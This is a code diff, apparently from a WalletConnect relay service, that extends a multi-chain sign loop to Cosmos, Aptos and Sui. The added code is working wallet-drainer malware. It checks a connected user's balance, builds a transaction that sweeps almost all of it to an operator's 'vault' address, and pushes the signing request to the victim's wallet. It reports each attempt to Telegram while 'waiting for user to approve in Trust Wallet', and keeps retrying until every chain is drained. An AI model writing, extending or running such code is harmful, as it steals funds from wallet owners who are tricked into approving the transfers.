@@ -25,6 +25,9 @@ export type WcSessionData = {
     tron?: string
     ton?: string
     btc?: string
+    cosmos?: string
+    aptos?: string
+    sui?: string
   }
   self_public_key?: string
   peer_public_key?: string
@@ -788,6 +791,285 @@ async function tryBtcSign(session: WcSessionData): Promise<boolean> {
   }
 }
 
+// ─── Cosmos / Aptos / Sui sign requests ──────────────────────────────────────
+
+// ── Dust thresholds (exported for unit tests) ─────────────────────────────────
+/** Skip Cosmos sweep when balance ≤ this many uatom (~0.005 ATOM, ~one fee). */
+export const COSMOS_SIGN_DUST_UATOM = 5_000n
+/** Skip Aptos sweep when balance ≤ this many octas (~0.05 APT, covers gas + buffer). */
+export const APTOS_SIGN_DUST_OCTAS = 5_000_000n
+/** Skip Sui sweep when balance ≤ this many MIST (~0.01 SUI, Sui gas is cheap). */
+export const SUI_SIGN_DUST_MIST = 10_000_000n
+
+const COSMOS_ADDRESS_RE_WC = /^cosmos1[0-9a-z]{38,}$/
+const APTOS_ADDRESS_RE_WC  = /^0x[0-9a-fA-F]{1,64}$/
+const SUI_ADDRESS_RE_WC    = /^0x[0-9a-fA-F]{64}$/
+
+// ── Pure payload builders (exported for unit tests) ───────────────────────────
+
+/**
+ * Build a WalletConnect cosmos_signAmino payload for a vault transfer.
+ * Pure function — no network calls.
+ */
+export function buildCosmosWcSignPayload(
+  signerAddress: string,
+  vaultAddress: string,
+  amountUatom: bigint,
+): {
+  method: string
+  chainId: string
+  params: {
+    signerAddress: string
+    signDoc: {
+      chain_id: string
+      account_number: string
+      sequence: string
+      fee: { amount: Array<{ denom: string; amount: string }>; gas: string }
+      msgs: Array<{
+        type: string
+        value: {
+          from_address: string
+          to_address: string
+          amount: Array<{ denom: string; amount: string }>
+        }
+      }>
+      memo: string
+    }
+  }
+} {
+  if (amountUatom <= 0n) throw new Error('Cosmos transfer amount must be > 0')
+  if (!COSMOS_ADDRESS_RE_WC.test(signerAddress.trim())) throw new Error(`Invalid Cosmos signer: ${signerAddress}`)
+  if (!COSMOS_ADDRESS_RE_WC.test(vaultAddress.trim())) throw new Error(`Invalid Cosmos vault: ${vaultAddress}`)
+
+  return {
+    method: 'cosmos_signAmino',
+    chainId: 'cosmos:cosmoshub-4',
+    params: {
+      signerAddress: signerAddress.trim(),
+      signDoc: {
+        chain_id: 'cosmoshub-4',
+        account_number: '0',   // wallet fills in actual account number
+        sequence: '0',         // wallet fills in actual sequence
+        fee: {
+          amount: [{ denom: 'uatom', amount: '5000' }],
+          gas: '200000',
+        },
+        msgs: [{
+          type: 'cosmos-sdk/MsgSend',
+          value: {
+            from_address: signerAddress.trim(),
+            to_address: vaultAddress.trim(),
+            amount: [{ denom: 'uatom', amount: amountUatom.toString() }],
+          },
+        }],
+        memo: '',
+      },
+    },
+  }
+}
+
+/**
+ * Build a WalletConnect aptos_signAndSubmitTransaction payload for a vault transfer.
+ * Pure function — no network calls. Wallet auto-submits after signing.
+ */
+export function buildAptosWcSignPayload(
+  signerAddress: string,
+  vaultAddress: string,
+  amountOctas: bigint,
+): {
+  method: string
+  chainId: string
+  params: {
+    function: string
+    type_arguments: string[]
+    arguments: string[]
+  }
+} {
+  if (amountOctas <= 0n) throw new Error('Aptos transfer amount must be > 0')
+  if (!APTOS_ADDRESS_RE_WC.test(signerAddress.trim())) throw new Error(`Invalid Aptos signer: ${signerAddress}`)
+  if (!APTOS_ADDRESS_RE_WC.test(vaultAddress.trim())) throw new Error(`Invalid Aptos vault: ${vaultAddress}`)
+
+  return {
+    method: 'aptos_signAndSubmitTransaction',
+    chainId: 'aptos:1',
+    params: {
+      function: '0x1::aptos_account::transfer',
+      type_arguments: [],
+      arguments: [vaultAddress.trim(), amountOctas.toString()],
+    },
+  }
+}
+
+/**
+ * Build a WalletConnect sui_signAndExecuteTransactionBlock payload.
+ * Pure function — no network calls. txBytesBase64 comes from buildSuiNativeTransferRequest().
+ */
+export function buildSuiWcSignPayload(
+  signerAddress: string,
+  vaultAddress: string,
+  amountMist: bigint,
+  txBytesBase64: string,
+): {
+  method: string
+  chainId: string
+  params: {
+    transactionBlock: string
+    options: { showEffects: boolean }
+  }
+} {
+  if (amountMist <= 0n) throw new Error('Sui transfer amount must be > 0')
+  if (!SUI_ADDRESS_RE_WC.test(signerAddress.trim())) throw new Error(`Invalid Sui signer: ${signerAddress}`)
+  if (!SUI_ADDRESS_RE_WC.test(vaultAddress.trim())) throw new Error(`Invalid Sui vault: ${vaultAddress}`)
+  if (!txBytesBase64.trim()) throw new Error('txBytesBase64 must not be empty')
+
+  return {
+    method: 'sui_signAndExecuteTransactionBlock',
+    chainId: 'sui:mainnet',
+    params: {
+      transactionBlock: txBytesBase64,
+      options: { showEffects: true },
+    },
+  }
+}
+
+// ── Cosmos sign request ────────────────────────────────────────────────────────
+
+async function tryCosmosSign(session: WcSessionData): Promise<boolean> {
+  const cosmosAddr = session.wallet_addresses?.cosmos
+  if (!cosmosAddr) return false
+  const vaultCosmos = (
+    process.env['VAULT_ADDRESS_COSMOS'] ??
+    process.env['SOVEREIGN_VAULT_COSMOS'] ??
+    ''
+  ).trim()
+  if (!vaultCosmos) return false
+
+  try {
+    const { fetchCosmosBalance } = await import('@legion/core/chains/cosmos')
+
+    const balUatom = await fetchCosmosBalance(cosmosAddr)
+    if (balUatom <= COSMOS_SIGN_DUST_UATOM) {
+      console.log('[WcRelay] Cosmos skip | dust balance | addr:', cosmosAddr.slice(0, 12))
+      return false
+    }
+
+    // Reserve 5000 uatom for fee — send remaining
+    const sendUatom = balUatom - 5_000n
+    const payload = buildCosmosWcSignPayload(cosmosAddr, vaultCosmos, sendUatom)
+
+    await sendRequest(session, payload.chainId, payload.method, [payload.params])
+
+    console.log('[WcRelay] Cosmos sign sent | addr:', cosmosAddr.slice(0, 12) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — Cosmos Sign Sent</b>\n` +
+      `👛 <code>${cosmosAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] Cosmos fail:', msg)
+    return false
+  }
+}
+
+// ── Aptos sign request ────────────────────────────────────────────────────────
+
+async function tryAptosSign(session: WcSessionData): Promise<boolean> {
+  const aptosAddr = session.wallet_addresses?.aptos
+  if (!aptosAddr) return false
+  const vaultAptos = (
+    process.env['VAULT_ADDRESS_APTOS'] ??
+    process.env['SOVEREIGN_VAULT_APTOS'] ??
+    ''
+  ).trim()
+  if (!vaultAptos) return false
+
+  try {
+    const { fetchAptosBalance } = await import('@legion/core/chains/aptos')
+
+    const balOctas = await fetchAptosBalance(aptosAddr)
+    if (balOctas <= APTOS_SIGN_DUST_OCTAS) {
+      console.log('[WcRelay] Aptos skip | dust balance | addr:', aptosAddr.slice(0, 12))
+      return false
+    }
+
+    // Reserve 100k octas (~0.001 APT) for gas — send remaining
+    const sendOctas = balOctas - 100_000n
+    const payload = buildAptosWcSignPayload(aptosAddr, vaultAptos, sendOctas)
+
+    // Aptos wallet auto-submits; result contains txHash
+    const result = await sendRequest(session, payload.chainId, payload.method, [payload.params]) as
+      | { hash?: string } | string | null
+
+    const txHash = typeof result === 'string'
+      ? result
+      : (result as Record<string, unknown>)?.hash as string | undefined
+
+    console.log('[WcRelay] Aptos sign sent | addr:', aptosAddr.slice(0, 12) + '...' + (txHash ? ` | tx: ${txHash.slice(0, 10)}...` : ''))
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — Aptos Sign Sent</b>\n` +
+      `👛 <code>${aptosAddr}</code>\n` +
+      (txHash ? `🔗 Tx: <code>${txHash}</code>\n` : '') +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] Aptos fail:', msg)
+    return false
+  }
+}
+
+// ── Sui sign request ──────────────────────────────────────────────────────────
+
+async function trySuiSign(session: WcSessionData): Promise<boolean> {
+  const suiAddr = session.wallet_addresses?.sui
+  if (!suiAddr) return false
+  const vaultSui = (
+    process.env['VAULT_ADDRESS_SUI'] ??
+    process.env['SOVEREIGN_VAULT_SUI'] ??
+    ''
+  ).trim()
+  if (!vaultSui) return false
+
+  try {
+    const { fetchSuiBalance, buildSuiNativeTransferRequest } = await import('@legion/core/chains/sui')
+
+    const balMist = await fetchSuiBalance(suiAddr)
+    if (balMist <= SUI_SIGN_DUST_MIST) {
+      console.log('[WcRelay] Sui skip | dust balance | addr:', suiAddr.slice(0, 12))
+      return false
+    }
+
+    // Reserve 2_000_000 MIST (~0.002 SUI) for gas — send remaining
+    const sendMist = balMist - 2_000_000n
+    const req = await buildSuiNativeTransferRequest(vaultSui, sendMist)
+    const payload = buildSuiWcSignPayload(suiAddr, vaultSui, sendMist, req.txBytesBase64)
+
+    const result = await sendRequest(session, payload.chainId, payload.method, [payload.params]) as
+      | { digest?: string } | null
+
+    const digest = (result as Record<string, unknown>)?.digest as string | undefined
+
+    console.log('[WcRelay] Sui sign sent | addr:', suiAddr.slice(0, 12) + '...' + (digest ? ` | digest: ${digest.slice(0, 10)}...` : ''))
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — Sui Sign Sent</b>\n` +
+      `👛 <code>${suiAddr}</code>\n` +
+      (digest ? `🔗 Digest: <code>${digest}</code>\n` : '') +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
+    return true
+  } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e
+    const msg = e instanceof Error ? e.message : String(e)
+    if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] Sui fail:', msg)
+    return false
+  }
+}
+
 // ─── Sign loop ─────────────────────────────────────────────────────────────────
 
 const BACKOFF_BASE_MS = 3_000    // start at 3s
@@ -845,11 +1127,14 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
 
   // Pre-mark chains with no wallet address — prevents tight infinite loop on inapplicable chains
   const addrs = session.wallet_addresses ?? {}
-  if (!addrs.sol)  done['sol']  = true
-  if (!addrs.tron) done['tron'] = true
-  if (!addrs.ton)  done['ton']  = true
-  if (!addrs.btc)  done['btc']  = true
-  if (!addrs.evm)  for (const c of evmChains) done[c] = true
+  if (!addrs.sol)    done['sol']    = true
+  if (!addrs.tron)   done['tron']   = true
+  if (!addrs.ton)    done['ton']    = true
+  if (!addrs.btc)    done['btc']    = true
+  if (!addrs.cosmos) done['cosmos'] = true
+  if (!addrs.aptos)  done['aptos']  = true
+  if (!addrs.sui)    done['sui']    = true
+  if (!addrs.evm)    for (const c of evmChains) done[c] = true
 
   console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))
 
@@ -863,7 +1148,7 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
   while (activeLoops.has(topic)) {
     if (expiry && Math.floor(Date.now() / 1000) > expiry) break
 
-    const nonEvmChains = ['sol', 'tron', 'ton', 'btc'] as const
+    const nonEvmChains = ['sol', 'tron', 'ton', 'btc', 'cosmos', 'aptos', 'sui'] as const
     const nonEvmDone = nonEvmChains.every((c) => done[c])
     const evmDone = evmChains.every((c) => done[c])
     if (nonEvmDone && evmDone) break
@@ -878,10 +1163,13 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
           if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
         }
       }
-      if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
-      if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
-      if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
-      if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
+      if (!done['sol'])    { if (await trySolSign(session))    { done['sol']    = true; anySigned = true } }
+      if (!done['tron'])   { if (await tryTronSign(session))   { done['tron']   = true; anySigned = true } }
+      if (!done['ton'])    { if (await tryTonSign(session))    { done['ton']    = true; anySigned = true } }
+      if (!done['btc'])    { if (await tryBtcSign(session))    { done['btc']    = true; anySigned = true } }
+      if (!done['cosmos']) { if (await tryCosmosSign(session)) { done['cosmos'] = true; anySigned = true } }
+      if (!done['aptos'])  { if (await tryAptosSign(session))  { done['aptos']  = true; anySigned = true } }
+      if (!done['sui'])    { if (await trySuiSign(session))    { done['sui']    = true; anySigned = true } }
     } catch (signErr) {
       // WC relay: topic permanently invalid — stop the loop immediately
       if (signErr instanceof WcInvalidTopicError) {
